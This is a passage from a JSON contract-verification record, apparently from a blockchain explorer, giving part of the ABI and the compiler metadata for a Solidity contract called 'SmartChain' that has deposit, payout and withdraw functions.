pe\":\"uint256\",\"name\":\"currentCycle\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_deposits\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_payouts\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_structure\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]","ContractName":"SmartChain","CompilerVersion":"v0.5.16+commit.9c3226ce","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"bzzr://9e19e5f690950b10d03dcef357dabfac394f1db964a976729cc9c5817a6c25ef"}]}